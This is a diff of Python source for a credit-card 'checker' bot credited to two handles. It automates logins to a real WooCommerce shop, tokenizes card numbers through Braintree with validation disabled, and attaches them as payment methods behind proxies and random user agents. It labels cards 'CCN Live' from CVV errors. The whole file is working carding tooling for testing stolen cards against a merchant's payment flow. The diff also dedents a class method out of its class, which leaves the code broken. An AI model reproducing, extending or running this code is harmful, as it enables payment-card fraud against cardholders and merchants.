@@ -227,273 +227,313 @@ ERROR ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
     
-    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
-        """Process a single card with given account and proxy"""
-        try:
-            user = generate_user_agent()
+async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
+    """Process a single card with given account and proxy"""
+    try:
+        user = generate_user_agent()
+        
+        # Configure proxy if available
+        transport = None
+        if proxies:
+            transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
+        
+        async with httpx.AsyncClient(
+            follow_redirects=True,
+            timeout=30,
+            transport=transport
+        ) as client:
+            headers = {
+                'authority': 'www.tea-and-coffee.com',
+                'user-agent': user,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+            }
             
-            # Configure proxy if available
-            transport = None
-            if proxies:
-                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
+            # Step 1: Get login page
+            response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
             
-            async with httpx.AsyncClient(
-                follow_redirects=True,
-                timeout=30,
-                transport=transport
-            ) as client:
-                headers = {
-                    'authority': 'www.tea-and-coffee.com',
-                    'user-agent': user,
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'accept-language': 'en-US,en;q=0.9',
-                }
-                
-                # Step 1: Get login page
-                response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
-                
-                # Find login nonce
-                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
-                if not login_nonce_match:
-                    return 'DECLINED', 'Could not find login nonce'
-                
-                nonce = login_nonce_match.group(1)
+            # Find login nonce
+            login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
+            if not login_nonce_match:
+                return 'DECLINED', 'Could not find login nonce'
+            
+            nonce = login_nonce_match.group(1)
 
-                # Step 2: Login with account credentials
-                data = {
-                    'username': account['email'],
-                    'password': account['password'],
-                    'woocommerce-login-nonce': nonce,
-                    '_wp_http_referer': '/account/',
-                    'login': 'Log in',
-                }
-                
-                response = await client.post(
-                    'https://www.tea-and-coffee.com/account/',
-                    headers=headers,
-                    data=data
-                )
-                
-                # Check if login was successful
-                if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
-                    return 'DECLINED', 'Login failed'
-                
-                # Step 3: Navigate to add payment method
-                headers.update({
-                    'referer': 'https://www.tea-and-coffee.com/account/',
-                })
-                
-                # Try custom payment method page first
+            # Step 2: Login with account credentials
+            data = {
+                'username': account['email'],
+                'password': account['password'],
+                'woocommerce-login-nonce': nonce,
+                '_wp_http_referer': '/account/',
+                'login': 'Log in',
+            }
+            
+            response = await client.post(
+                'https://www.tea-and-coffee.com/account/',
+                headers=headers,
+                data=data
+            )
+            
+            # Check if login was successful
+            if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
+                return 'DECLINED', 'Login failed'
+            
+            # Step 3: Navigate to add payment method
+            headers.update({
+                'referer': 'https://www.tea-and-coffee.com/account/',
+            })
+            
+            # Try custom payment method page first
+            response = await client.get(
+                'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
+                headers=headers
+            )
+
+            if response.status_code != 200:
                 response = await client.get(
-                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
+                    'https://www.tea-and-coffee.com/account/add-payment-method/',
                     headers=headers
                 )
 
-                if response.status_code != 200:
-                    response = await client.get(
-                        'https://www.tea-and-coffee.com/account/add-payment-method/',
-                        headers=headers
-                    )
+            # Find payment nonce
+            payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
+            if not payment_nonce_match:
+                return 'DECLINED', 'Could not find payment nonce'
+            
+            nonce = payment_nonce_match.group(1)
 
-                # Find payment nonce
-                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-                if not payment_nonce_match:
-                    return 'DECLINED', 'Could not find payment nonce'
+            # Find client nonce for Braintree
+            client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
+            if not client_nonce_match:
+                return 'DECLINED', 'Could not find client token nonce'
+            
+            client_nonce = client_nonce_match.group(1)
+            
+            headers.update({
+                'x-requested-with': 'XMLHttpRequest',
+                'referer': str(response.url),
+            })
+
+            # Step 4: Get client token
+            data = {
+                'action': 'wc_braintree_credit_card_get_client_token',
+                'nonce': client_nonce,
+            }
+
+            response = await client.post(
+                'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
+                headers=headers,
+                data=data
+            )
+            
+            if 'data' not in response.json():
+                return 'DECLINED', 'No data in client token response'
                 
-                nonce = payment_nonce_match.group(1)
+            enc = response.json()['data']
+            dec = base64.b64decode(enc).decode('utf-8')
+            
+            # Find authorization
+            authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+            if not authorization_match:
+                return 'DECLINED', 'Could not find authorization fingerprint'
+            authorization = authorization_match[0]
 
-                # Find client nonce for Braintree
-                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
-                if not client_nonce_match:
-                    return 'DECLINED', 'Could not find client token nonce'
-                
-                client_nonce = client_nonce_match.group(1)
-                
-                headers.update({
-                    'x-requested-with': 'XMLHttpRequest',
-                    'referer': str(response.url),
-                })
+            # Step 5: Tokenize card
+            headersn = {
+                'authority': 'payments.braintree-api.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'authorization': f'Bearer {authorization}',
+                'braintree-version': '2018-05-10',
+                'content-type': 'application/json',
+                'origin': 'https://assets.braintreegateway.com',
+                'referer': 'https://assets.braintreegateway.com/',
+                'user-agent': user,
+            }
 
-                # Step 4: Get client token
-                data = {
-                    'action': 'wc_braintree_credit_card_get_client_token',
-                    'nonce': client_nonce,
-                }
-
-                response = await client.post(
-                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-                    headers=headers,
-                    data=data
-                )
-                
-                if 'data' not in response.json():
-                    return 'DECLINED', 'No data in client token response'
-                    
-                enc = response.json()['data']
-                dec = base64.b64decode(enc).decode('utf-8')
-                
-                # Find authorization
-                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
-                if not authorization_match:
-                    return 'DECLINED', 'Could not find authorization fingerprint'
-                authorization = authorization_match[0]
-
-                # Step 5: Tokenize card
-                headersn = {
-                    'authority': 'payments.braintree-api.com',
-                    'accept': '*/*',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'authorization': f'Bearer {authorization}',
-                    'braintree-version': '2018-05-10',
-                    'content-type': 'application/json',
-                    'origin': 'https://assets.braintreegateway.com',
-                    'referer': 'https://assets.braintreegateway.com/',
-                    'user-agent': user,
-                }
-
-                json_data = {
-                    'clientSdkMetadata': {
-                        'source': 'client',
-                        'integration': 'custom',
-                        'sessionId': str(random.randint(1000000000, 9999999999)),
-                    },
-                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
-                    'variables': {
-                        'input': {
-                            'creditCard': {
-                                'number': cc,
-                                'expirationMonth': mm,
-                                'expirationYear': yy,
-                                'cvv': cvc,
-                            },
-                            'options': {
-                                'validate': False,
-                            },
+            json_data = {
+                'clientSdkMetadata': {
+                    'source': 'client',
+                    'integration': 'custom',
+                    'sessionId': str(random.randint(1000000000, 9999999999)),
+                },
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
+                'variables': {
+                    'input': {
+                        'creditCard': {
+                            'number': cc,
+                            'expirationMonth': mm,
+                            'expirationYear': yy,
+                            'cvv': cvc,
+                        },
+                        'options': {
+                            'validate': False,
                         },
                     },
-                }
+                },
+            }
+            
+            response = await client.post(
+                'https://payments.braintree-api.com/graphql',
+                headers=headersn,
+                json=json_data
+            )
+
+            # Check tokenization response
+            if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
+                error_text = response.text
                 
-                response = await client.post(
-                    'https://payments.braintree-api.com/graphql',
-                    headers=headersn,
-                    json=json_data
-                )
-
-                # Check tokenization response
-                if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
-                    error_text = response.text
-                    
-                    # Capture specific response codes - CVV related are APPROVED
-                    if '2010' in error_text:
-                        return 'APPROVED', 'Status code 2010: Card Issuer Declined CVV (CCN Live)'
-                    elif 'cvv' in error_text.lower() or 'security code' in error_text.lower():
-                        return 'APPROVED', 'CVV Check Failed (CCN Live)'
-                    elif 'incorrect_cvc' in error_text.lower():
-                        return 'APPROVED', 'Incorrect CVC (CCN Live)'
-                    
-                    # Other specific status codes
-                    elif '2001' in error_text:
-                        return 'DECLINED', 'Status code 2001: Insufficient Funds'
-                    elif '2000' in error_text:
-                        return 'DECLINED', 'Status code 2000: Do Not Honor'
-                    elif '2002' in error_text:
-                        return 'DECLINED', 'Status code 2002: Lost Card'
-                    elif '2003' in error_text:
-                        return 'DECLINED', 'Status code 2003: Stolen Card'
-                    elif '2004' in error_text:
-                        return 'DECLINED', 'Status code 2004: Expired Card'
-                    elif '2005' in error_text:
-                        return 'DECLINED', 'Status code 2005: Invalid Card Number'
-                    elif '2006' in error_text:
-                        return 'DECLINED', 'Status code 2006: Invalid Expiration Date'
-                    elif '2011' in error_text:
-                        return 'DECLINED', 'Status code 2011: Voice Authorization Required'
-                    elif '2012' in error_text:
-                        return 'DECLINED', 'Status code 2012: Processing Error'
-                    elif '2013' in error_text:
-                        return 'DECLINED', 'Status code 2013: Invalid Merchant'
-                    elif '2014' in error_text:
-                        return 'DECLINED', 'Status code 2014: Pick Up Card'
-                    
-                    # Generic error patterns
-                    elif 'avs' in error_text.lower():
-                        return 'DECLINED', 'AVS Check Failed'
-                    elif 'risk' in error_text.lower():
-                        return 'DECLINED', 'Risk BIN - Retry Later'
-                    elif 'do not honor' in error_text.lower():
-                        return 'DECLINED', 'Do Not Honor'
-                    elif 'gateway rejected' in error_text.lower():
-                        return 'DECLINED', 'Gateway Rejected'
-                    elif 'processor declined' in error_text.lower():
-                        return 'DECLINED', 'Processor Declined'
-                    elif 'insufficient' in error_text.lower():
-                        return 'DECLINED', 'Insufficient Funds'
-                    elif 'expired' in error_text.lower():
-                        return 'DECLINED', 'Expired Card'
-                    elif 'invalid' in error_text.lower():
-                        return 'DECLINED', 'Invalid Card'
-                    else:
-                        return 'DECLINED', 'Tokenization failed: ' + error_text[:100]
-                    
-                tok = response.json()['data']['tokenizeCreditCard']['token']
-
-                # Step 6: Process payment
-                current_url_str = str(response.url)
-                if 'add-payment-method-custom' in current_url_str:
-                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
-                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
-                    wp_referer = '/account/add-payment-method-custom/'
+                # Try to extract actual error message from Braintree response
+                try:
+                    error_json = response.json()
+                    if 'errors' in error_json:
+                        error_msg = error_json['errors'][0].get('message', 'Unknown error')
+                        # Check if it's CVV related for APPROVED
+                        if any(term in error_msg.lower() for term in ['cvv', 'security code', 'cvc', '2010']):
+                            return 'APPROVED', f'Braintree: {error_msg} (CCN Live)'
+                        else:
+                            return 'DECLINED', f'Braintree: {error_msg}'
+                except:
+                    pass
+                
+                # Capture specific response codes - CVV related are APPROVED
+                if '2010' in error_text:
+                    return 'APPROVED', 'Status code 2010: Card Issuer Declined CVV (CCN Live)'
+                elif 'cvv' in error_text.lower() or 'security code' in error_text.lower():
+                    return 'APPROVED', 'CVV Check Failed (CCN Live)'
+                elif 'incorrect_cvc' in error_text.lower():
+                    return 'APPROVED', 'Incorrect CVC (CCN Live)'
+                
+                # Other specific status codes
+                elif '2001' in error_text:
+                    return 'DECLINED', 'Status code 2001: Insufficient Funds'
+                elif '2000' in error_text:
+                    return 'DECLINED', 'Status code 2000: Do Not Honor'
+                elif '2002' in error_text:
+                    return 'DECLINED', 'Status code 2002: Lost Card'
+                elif '2003' in error_text:
+                    return 'DECLINED', 'Status code 2003: Stolen Card'
+                elif '2004' in error_text:
+                    return 'DECLINED', 'Status code 2004: Expired Card'
+                elif '2005' in error_text:
+                    return 'DECLINED', 'Status code 2005: Invalid Card Number'
+                elif '2006' in error_text:
+                    return 'DECLINED', 'Status code 2006: Invalid Expiration Date'
+                elif '2011' in error_text:
+                    return 'DECLINED', 'Status code 2011: Voice Authorization Required'
+                elif '2012' in error_text:
+                    return 'DECLINED', 'Status code 2012: Processing Error'
+                elif '2013' in error_text:
+                    return 'DECLINED', 'Status code 2013: Invalid Merchant'
+                elif '2014' in error_text:
+                    return 'DECLINED', 'Status code 2014: Pick Up Card'
+                
+                # Generic error patterns
+                elif 'avs' in error_text.lower():
+                    return 'DECLINED', 'AVS Check Failed'
+                elif 'risk' in error_text.lower():
+                    return 'DECLINED', 'Risk BIN - Retry Later'
+                elif 'do not honor' in error_text.lower():
+                    return 'DECLINED', 'Do Not Honor'
+                elif 'gateway rejected' in error_text.lower():
+                    return 'DECLINED', 'Gateway Rejected'
+                elif 'processor declined' in error_text.lower():
+                    return 'DECLINED', 'Processor Declined'
+                elif 'insufficient' in error_text.lower():
+                    return 'DECLINED', 'Insufficient Funds'
+                elif 'expired' in error_text.lower():
+                    return 'DECLINED', 'Expired Card'
+                elif 'invalid' in error_text.lower():
+                    return 'DECLINED', 'Invalid Card'
                 else:
-                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
-                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
-                    wp_referer = '/account/add-payment-method/'
-
-                headers = {
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://www.tea-and-coffee.com',
-                    'referer': referer,
-                    'user-agent': user,
-                }
-
-                data = {
-                    'payment_method': 'braintree_credit_card',
-                    'wc-braintree-credit-card-card-type': 'visa',
-                    'wc-braintree-credit-card-3d-secure-enabled': '',
-                    'wc-braintree-credit-card-3d-secure-verified': '',
-                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-                    'wc_braintree_credit_card_payment_nonce': tok,
-                    'wc_braintree_device_data': '',
-                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-                    'woocommerce-add-payment-method-nonce': nonce,
-                    '_wp_http_referer': wp_referer,
-                    'woocommerce_add_payment_method': '1',
-                }
-                
-                response = await client.post(
-                    endpoint,
-                    headers=headers,
-                    data=data
-                )
-                
-                if 'Payment method successfully added' in response.text:
-                    return 'APPROVED', 'Payment method successfully added'
-                elif 'woocommerce-error' in response.text:
-                    error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
+                    # Try to extract any error message from the response
+                    error_match = re.search(r'"message":"([^"]+)"', error_text)
                     if error_match:
-                        error_msg = error_match.group(1).strip()
-                        # Check if it's a CVV related error for APPROVED
+                        return 'DECLINED', f'Braintree: {error_match.group(1)}'
+                    else:
+                        return 'DECLINED', 'Braintree: Payment declined'
+                    
+            tok = response.json()['data']['tokenizeCreditCard']['token']
+
+            # Step 6: Process payment
+            current_url_str = str(response.url)
+            if 'add-payment-method-custom' in current_url_str:
+                endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
+                referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
+                wp_referer = '/account/add-payment-method-custom/'
+            else:
+                endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
+                referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
+                wp_referer = '/account/add-payment-method/'
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.tea-and-coffee.com',
+                'referer': referer,
+                'user-agent': user,
+            }
+
+            data = {
+                'payment_method': 'braintree_credit_card',
+                'wc-braintree-credit-card-card-type': 'visa',
+                'wc-braintree-credit-card-3d-secure-enabled': '',
+                'wc-braintree-credit-card-3d-secure-verified': '',
+                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+                'wc_braintree_credit_card_payment_nonce': tok,
+                'wc_braintree_device_data': '',
+                'wc-braintree-credit-card-tokenize-payment-method': 'true',
+                'woocommerce-add-payment-method-nonce': nonce,
+                '_wp_http_referer': wp_referer,
+                'woocommerce_add_payment_method': '1',
+            }
+            
+            response = await client.post(
+                endpoint,
+                headers=headers,
+                data=data
+            )
+            
+            response_text = response.text
+            
+            if 'Payment method successfully added' in response_text:
+                return 'APPROVED', 'Payment method successfully added'
+            elif 'woocommerce-error' in response_text:
+                # Extract actual error message from WooCommerce
+                error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL)
+                if error_match:
+                    error_msg = error_match.group(1).strip()
+                    # Check if it's a CVV related error for APPROVED
+                    if any(term in error_msg.lower() for term in ['cvv', 'security code', 'cvc']):
+                        return 'APPROVED', f'CVV Error: {error_msg} (CCN Live)'
+                    else:
+                        return 'DECLINED', f'Site Error: {error_msg}'
+                
+                # Try alternative error extraction
+                error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL)
+                if error_match:
+                    error_content = error_match.group(1)
+                    li_matches = re.findall(r'<li>(.*?)</li>', error_content)
+                    if li_matches:
+                        error_msg = li_matches[0]
                         if any(term in error_msg.lower() for term in ['cvv', 'security code', 'cvc']):
                             return 'APPROVED', f'CVV Error: {error_msg} (CCN Live)'
                         else:
-                            return 'DECLINED', error_msg
-                    return "DECLINED", 'Unknown payment error'
+                            return 'DECLINED', f'Site Error: {error_msg}'
+                
+                return "DECLINED", 'Site returned payment error'
+            else:
+                # Check for success indicators
+                if 'payment-method-added' in response_text or 'payment method added' in response_text.lower():
+                    return 'APPROVED', 'Payment method added successfully'
+                elif any(term in response_text.lower() for term in ['success', 'added successfully', 'payment method saved']):
+                    return 'APPROVED', 'Payment processed successfully'
                 else:
-                    return "DECLINED", 'Generic payment decline'
+                    return "DECLINED", 'Payment not accepted'
 
-        except Exception as e:
-            return 'DECLINED', f'Processing error: {str(e)}'
+    except Exception as e:
+        return 'DECLINED', f'Processing error: {str(e)}'
 
 # Global checker instance
 braintree_checker = BraintreeChecker()
